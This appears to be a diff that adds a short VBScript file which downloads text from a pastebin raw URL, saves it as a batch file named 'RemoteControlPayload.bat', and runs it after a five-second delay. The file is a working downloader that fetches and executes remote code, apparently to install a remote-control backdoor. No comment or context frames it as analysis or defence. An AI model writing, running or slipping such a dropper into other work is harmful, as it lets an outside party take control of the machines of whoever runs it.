@@ -1,0 +1,20 @@
+Option Explicit
+Dim WshShell, strCurDir
+Set WshShell = CreateObject("WScript.Shell")
+strCurDir    = WshShell.CurrentDirectory
+Dim http : Set http = CreateObject( "MSXML2.ServerXmlHttp" )
+http.Open "GET", "https://pastebin.com/raw/b0zEUnxE", False
+http.Send
+Dim FSO
+Dim OutPutFile
+Dim LCurDir
+Dim RCurDir
+LCurDir = (strCurDir & "\RemoteControlPayload.bat")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+Set OutPutFile = FSO.OpenTextFile(LCurDir,2 , True)
+OutPutFile.WriteLine(http.responseText)
+WScript.sleep(5000)
+WshShell.run "cmd /c start RemoteControlPayload.bat"
+
+Set FSO= Nothing
